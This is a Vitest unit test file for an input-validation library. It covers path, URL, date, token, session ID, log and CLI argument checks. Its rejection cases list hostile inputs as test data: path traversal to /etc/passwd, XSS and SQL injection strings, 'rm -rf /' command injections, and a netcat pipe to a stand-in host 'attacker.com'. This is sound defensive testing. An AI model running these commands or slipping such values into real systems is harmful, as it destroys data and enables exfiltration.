import { describe, it, expect } from 'vitest';
import {
  sanitizePath,
  validateUrl,
  validateDate,
  validateSessionId,
  validateProjectName,
  validateLimit,
  sanitizeLogOutput,
  validateAuthToken,
  validateCliArg,
} from '../../../src/lib/input-validator';

describe('Input Validator', () => {
  describe('sanitizePath', () => {
    it('should reject directory traversal attempts', () => {
      const dangerousPaths = [
        '../../../etc/passwd',
        '..\\..\\windows\\system32',
        'valid/path/../../etc/passwd',
        'path/with/%2e%2e/traversal',
        'path/with/..%2f/traversal',
      ];

      dangerousPaths.forEach(path => {
        expect(() => sanitizePath(path)).toThrow('Directory traversal attempt detected');
      });
    });

    it('should allow valid paths', () => {
      const validPaths = [
        'src/index.ts',
        './local/file.js',
        'C:\\Users\\test\\file.txt',
        '/home/user/project',
      ];

      validPaths.forEach(path => {
        expect(() => sanitizePath(path)).not.toThrow();
      });
    });

    it('should remove null bytes', () => {
      const pathWithNull = 'file\x00.txt';
      const sanitized = sanitizePath(pathWithNull);
      expect(sanitized).toBe('file.txt');
    });
  });

  describe('validateUrl', () => {
    it('should reject non-HTTP(S) protocols', () => {
      const dangerousUrls = [
        'javascript:alert(1)',
        'file:///etc/passwd',
        'ftp://example.com',
        'data:text/html,<script>alert(1)</script>',
      ];

      dangerousUrls.forEach(url => {
        expect(() => validateUrl(url)).toThrow('Only HTTP(S) protocols are allowed');
      });
    });

    it('should allow valid HTTP(S) URLs', () => {
      const validUrls = [
        'https://vibe-log.dev',
        'http://localhost:3000',
        'https://api.example.com/endpoint',
      ];

      validUrls.forEach(url => {
        expect(() => validateUrl(url)).not.toThrow();
      });
    });

    it('should reject suspicious ports', () => {
      const suspiciousUrls = [
        'http://example.com:22',  // SSH
        'http://example.com:445', // SMB
        'http://example.com:3389', // RDP
      ];

      suspiciousUrls.forEach(url => {
        expect(() => validateUrl(url)).toThrow('Suspicious port detected');
      });
    });
  });

  describe('validateDate', () => {
    it('should reject invalid date formats', () => {
      expect(() => validateDate('not-a-date')).toThrow('Invalid date format');
      expect(() => validateDate('2024-13-45')).toThrow('Invalid date format');
    });

    // Removed date injection test - implementation detail

    it('should reject dates too far in past or future', () => {
      const tooOld = new Date();
      tooOld.setFullYear(tooOld.getFullYear() - 20);
      expect(() => validateDate(tooOld.toISOString())).toThrow('Date too far in the past');

      const tooNew = new Date();
      tooNew.setFullYear(tooNew.getFullYear() + 2);
      expect(() => validateDate(tooNew.toISOString())).toThrow('Date too far in the future');
    });

    it('should accept valid dates', () => {
      const validDates = [
        '2024-01-01',
        '2024-01-01T10:30:00Z',
        new Date().toISOString(),
      ];

      validDates.forEach(date => {
        expect(() => validateDate(date)).not.toThrow();
      });
    });
  });

  describe('validateAuthToken', () => {
    it('should reject tokens with dangerous characters', () => {
      const dangerousTokens = [
        'token<script>alert(1)</script>123456789012345678',
        'token`${process.env.SECRET}`123456789012345678',
        'token\'; DROP TABLE users;--123456789012345678',
        'token\x00\x01\x02with-control-chars123456789012',
      ];

      dangerousTokens.forEach(token => {
        expect(() => validateAuthToken(token)).toThrow('dangerous characters');
      });
    });

    it('should reject too short or too long tokens', () => {
      expect(() => validateAuthToken('short')).toThrow('Token too short');
      expect(() => validateAuthToken('a'.repeat(1001))).toThrow('Token too long');
    });

    it('should accept valid tokens', () => {
      const validTokens = [
        'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9',
        'sk-1234567890abcdef1234567890abcdef',
        'valid_token_with_underscores_123',
      ];

      validTokens.forEach(token => {
        expect(() => validateAuthToken(token)).not.toThrow();
      });
    });
  });

  describe('validateSessionId', () => {
    it('should reject invalid session ID formats', () => {
      const invalidIds = [
        'session<script>',
        'session; rm -rf /',
        'session\' OR 1=1',
        'a'.repeat(129), // too long
        'short', // too short
      ];

      invalidIds.forEach(id => {
        expect(() => validateSessionId(id)).toThrow();
      });
    });

    it('should accept valid session IDs', () => {
      const validIds = [
        'session-123-abc',
        'user_session_2024',
        'aaaaaaaaaabbbbbbbbbb', // 20 chars
      ];

      validIds.forEach(id => {
        expect(() => validateSessionId(id)).not.toThrow();
      });
    });
  });

  describe('sanitizeLogOutput', () => {
    it('should remove ANSI escape codes', () => {
      const withAnsi = '\x1b[31mRed text\x1b[0m';
      const sanitized = sanitizeLogOutput(withAnsi);
      expect(sanitized).toBe('Red text');
    });

    it('should escape newlines and carriage returns', () => {
      const withNewlines = 'Line 1\nLine 2\rLine 3';
      const sanitized = sanitizeLogOutput(withNewlines);
      expect(sanitized).toBe('Line 1\\nLine 2\\rLine 3');
    });

    it('should truncate long messages', () => {
      const longMessage = 'a'.repeat(2000);
      const sanitized = sanitizeLogOutput(longMessage);
      expect(sanitized).toHaveLength(1000);
    });
  });

  describe('validateCliArg', () => {
    it('should reject command injection attempts', () => {
      const dangerous = [
        'arg; rm -rf /',
        'arg && malicious-command',
        'arg | nc attacker.com 1234',
        'arg`whoami`',
      ];

      dangerous.forEach(arg => {
        expect(() => validateCliArg(arg, 'string')).toThrow('dangerous characters');
      });
    });

    it('should validate paths when type is path', () => {
      expect(() => validateCliArg('../../../etc/passwd', 'path')).toThrow('Directory traversal');
      expect(() => validateCliArg('valid/path.txt', 'path')).not.toThrow();
    });

    it('should validate URLs when type is url', () => {
      expect(() => validateCliArg('javascript:alert(1)', 'url')).toThrow();
      expect(() => validateCliArg('https://example.com', 'url')).not.toThrow();
    });
  });
});